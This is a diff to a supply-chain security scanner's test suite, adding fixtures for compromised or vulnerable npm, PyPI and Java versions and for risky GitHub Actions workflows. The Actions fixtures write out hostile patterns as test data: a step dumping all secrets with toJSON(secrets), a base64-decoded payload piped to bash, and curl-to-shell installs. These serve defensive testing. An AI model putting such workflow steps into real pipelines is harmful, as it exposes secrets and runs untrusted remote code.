@@ -430,6 +430,48 @@ async function testSupplyChainScanner() {
   assert(results.some(r => r.type === 'suspicious-registry'), 'Detects non-standard registries');
   assert(results.some(r => r.package === 'evil-pkg'), 'Identifies suspicious package correctly');
   assert(!results.some(r => r.package === 'express'), 'Does not flag clean packages');
+
+  writeFixture('rsc-vulnerable/package-lock.json', JSON.stringify({ name: 'rsc', version: '1.0.0', lockfileVersion: 3, packages: {
+    '': { name: 'rsc', version: '1.0.0' },
+    'node_modules/react': { version: '19.2.8' },
+    'node_modules/react-server-dom-webpack': { version: '19.2.8' },
+    'node_modules/react-server-dom-turbopack': { version: '19.3.0' },
+  } }));
+  const rsc = await runSupplyChainScan(path.join(FIXTURE_DIR, 'rsc-vulnerable'), {});
+  assert(rsc.some(r => r.package === 'react-server-dom-webpack' && r.type === 'vulnerable-npm' && r.severity === 'critical'), 'Detects affected React Server Components webpack release');
+  assert(rsc.some(r => r.package === 'react-server-dom-turbopack' && r.type === 'vulnerable-npm'), 'Detects affected 19.3.0 boundary');
+  assert(!rsc.some(r => r.package === 'react' && r.advisory?.includes('126187')), 'Does not flag client React package for server-only advisory');
+  writeFixture('rsc-fixed/package-lock.json', JSON.stringify({ name: 'rsc', version: '1.0.0', lockfileVersion: 3, packages: {
+    '': { name: 'rsc', version: '1.0.0' },
+    'node_modules/react-server-dom-webpack': { version: '19.2.9' },
+    'node_modules/react-server-dom-parcel': { version: '19.0.9' },
+    'node_modules/react-server-dom-turbopack': { version: '19.3.1' },
+  } }));
+  assert(!(await runSupplyChainScan(path.join(FIXTURE_DIR, 'rsc-fixed'), {})).some(r => r.advisory?.includes('126187')), 'Does not flag patched React Server Components releases');
+  writeFixture('next-avif/package-lock.json', JSON.stringify({ name: 'next-avif', version: '1.0.0', lockfileVersion: 3, packages: {
+    '': { name: 'next-avif', version: '1.0.0' },
+    'node_modules/next': { version: '16.3.2' },
+  } }));
+  assert((await runSupplyChainScan(path.join(FIXTURE_DIR, 'next-avif'), {})).some(r => r.package === 'next' && r.advisory === 'GHSA-2xp9-vwfh-vxw4' && r.severity === 'critical'), 'Detects Next.js AVIF RCE below fixed release');
+  writeFixture('next-avif-fixed/package-lock.json', JSON.stringify({ name: 'next-avif', version: '1.0.0', lockfileVersion: 3, packages: {
+    '': { name: 'next-avif', version: '1.0.0' },
+    'node_modules/next': { version: '16.3.3' },
+  } }));
+  assert(!(await runSupplyChainScan(path.join(FIXTURE_DIR, 'next-avif-fixed'), {})).some(r => r.advisory === 'GHSA-2xp9-vwfh-vxw4'), 'Does not flag patched Next.js AVIF release');
+  writeFixture('keyv-worm/package-lock.json', JSON.stringify({ name: 'worm', version: '1.0.0', lockfileVersion: 3, packages: {
+    '': { name: 'worm', version: '1.0.0' },
+    'node_modules/keyv': { version: '6.0.0' },
+    'node_modules/cacheable': { version: '2.5.1' },
+    'node_modules/cache-manager': { version: '7.2.10' },
+    'node_modules/@cacheable/utils': { version: '2.5.1' },
+    'node_modules/@keyv/memcache': { version: '6.0.0' },
+  } }));
+  const worm = await runSupplyChainScan(path.join(FIXTURE_DIR, 'keyv-worm'), {});
+  assert(['keyv', 'cacheable', 'cache-manager', '@cacheable/utils', '@keyv/memcache'].every(name => worm.some(r => r.package === name && r.type === 'compromised-package' && r.severity === 'critical')), 'Detects exact keyv/cacheable worm seed releases');
+  writeFixture('keyv-safe/package-lock.json', JSON.stringify({ name: 'safe', version: '1.0.0', lockfileVersion: 3, packages: {
+    '': { name: 'safe', version: '1.0.0' }, 'node_modules/keyv': { version: '4.5.4' }, 'node_modules/cacheable': { version: '2.5.0' },
+  } }));
+  assert(!(await runSupplyChainScan(path.join(FIXTURE_DIR, 'keyv-safe'), {})).some(r => ['keyv', 'cacheable'].includes(r.package) && r.type === 'compromised-package'), 'Does not flag clean keyv/cacheable versions');
 }
 
 async function testPythonScanner() {
@@ -448,6 +490,14 @@ async function testPythonScanner() {
 
   const emptyResults = await runPythonScan(path.join(FIXTURE_DIR, 'clean-project'), {});
   assert(emptyResults.length === 0, 'Non-Python project produces no findings');
+
+  writeFixture('agent-framework-malicious/requirements.txt', 'agent-framework==1.26.1\n');
+  const agentMalicious = await runPythonScan(path.join(FIXTURE_DIR, 'agent-framework-malicious'), {});
+  assert(agentMalicious.some(r => r.package === 'agent-framework' && r.type === 'compromised-pypi' && r.severity === 'critical' && r.advisory.includes('MAL-2026-20101')), 'Detects compromised agent-framework 1.26.1');
+  writeFixture('agent-framework-malicious2/requirements.txt', 'agent-framework==1.26.2\n');
+  assert((await runPythonScan(path.join(FIXTURE_DIR, 'agent-framework-malicious2'), {})).some(r => r.type === 'compromised-pypi'), 'Detects compromised agent-framework 1.26.2');
+  writeFixture('agent-framework-clean/requirements.txt', 'agent-framework==1.26.0\n');
+  assert(!(await runPythonScan(path.join(FIXTURE_DIR, 'agent-framework-clean'), {})).some(r => r.package === 'agent-framework' && r.type === 'compromised-pypi'), 'Does not flag last clean agent-framework release');
 }
 
 async function testDockerScanner() {
@@ -553,6 +603,14 @@ async function testJavaScanner() {
   assert((await runJavaScan(path.join(FIXTURE_DIR, 'java4shell-eol-dev'))).some(r => r.severity === 'medium'), 'Keeps unsupported Java developer pin visible as a hint');
   writeFixture('java4shell-mirror/Dockerfile', 'FROM registry.example.com/eclipse-temurin:17.0.22-jre\n');
   assert((await runJavaScan(path.join(FIXTURE_DIR, 'java4shell-mirror'))).some(r => r.type === 'java-runtime-unverified'), 'Does not assume a private mirror contains the official patched image');
+  writeFixture('java4shell-distroless/Dockerfile', 'FROM gcr.io/distroless/java17-debian12:nonroot\n');
+  assert((await runJavaScan(path.join(FIXTURE_DIR, 'java4shell-distroless'))).some(r => r.type === 'java-runtime-unverified' && r.severity === 'medium'), 'Reports unrecognized Java runtime images as unverified');
+  writeFixture('java4shell-compose-default/compose.yaml', 'services:\n  app:\n    image: ${JAVA_IMAGE:-eclipse-temurin:17.0.20-jre}\n');
+  assert((await runJavaScan(path.join(FIXTURE_DIR, 'java4shell-compose-default'))).some(r => r.severity === 'high'), 'Checks Compose image default expression');
+  writeFixture('java4shell-mitigated/Dockerfile', 'FROM eclipse-temurin:17.0.20-jre\nENV JAVA_TOOL_OPTIONS=-XX:-UseBASE64Intrinsics\n');
+  assert((await runJavaScan(path.join(FIXTURE_DIR, 'java4shell-mitigated'))).some(r => r.severity === 'low' && r.description.includes('declares -XX:-UseBASE64Intrinsics')), 'Notes declared mitigation without claiming deployed JVM is patched');
+  writeFixture('java4shell-comment-only/Dockerfile', 'FROM eclipse-temurin:17.0.20-jre\n# ENV JAVA_TOOL_OPTIONS=-XX:-UseBASE64Intrinsics\n');
+  assert((await runJavaScan(path.join(FIXTURE_DIR, 'java4shell-comment-only'))).some(r => r.severity === 'high'), 'Commented mitigation does not lower severity');
 }
 
 async function testRubyScanner() {
@@ -779,6 +837,36 @@ async function testActionsScanner() {
   assert(at('pr-target.yaml', 'actions-pwn-request').length === 1, 'pull_request_target checkout of PR head is flagged');
   assert(at('pr-target.yaml', 'actions-script-injection').some(r => r.description.includes('comment.body')),
     'Untrusted input in github-script script: block is flagged');
+
+  writeFixture('actions-loot/.github/workflows/audit.yml', [
+    'on: push',
+    'jobs:',
+    '  a:',
+    '    runs-on: ubuntu-latest',
+    '    steps:',
+    '      - env:',
+    '          ALL: ${{ toJSON(secrets) }}',
+    '        run: |',
+    '          echo "ZWNobyBoaQ==" | base64 -d | bash',
+    '          curl -fsSL https://get.example.com/install.sh | sh',
+    '      - run: echo "curl docs" && ls | sort',
+    '',
+  ].join('\n'));
+  const loot = await runActionsScan(path.join(FIXTURE_DIR, 'actions-loot'), {});
+  assert(loot.some(r => r.type === 'actions-secrets-dump' && r.severity === 'high' && r.line === 7),
+    'toJSON(secrets) is flagged high');
+  assert(loot.some(r => r.type === 'actions-remote-script' && r.severity === 'medium' && r.line === 9),
+    'base64-decoded shell payload is flagged medium');
+  assert(loot.some(r => r.type === 'actions-remote-script' && r.severity === 'low' && r.line === 10),
+    'curl | sh is flagged low');
+  assert(loot.filter(r => r.type === 'actions-remote-script').length === 2,
+    'Pipes that do not end in a shell are not flagged');
+  assert(!results.some(r => r.type === 'actions-secrets-dump' || r.type === 'actions-remote-script'),
+    'Ordinary workflows produce no secrets-dump or remote-script findings');
+  writeFixture('actions-remote-credential/.github/workflows/test.yml', 'jobs:\n  test:\n    steps:\n      - run: curl https://user:fake-password@example.com/install.sh | sh\n');
+  const remoteCredential = await runActionsScan(path.join(FIXTURE_DIR, 'actions-remote-credential'), {});
+  assert(remoteCredential.some(r => r.type === 'actions-remote-script') && !JSON.stringify(remoteCredential).includes('fake-password'),
+    'Remote-script finding does not echo credentials embedded in the workflow URL');
 
   const custom = await runActionsScan(path.join(FIXTURE_DIR, 'actions-test'), {
     knownCompromised: { actions: ['Some-Org/Lint-Action'] },
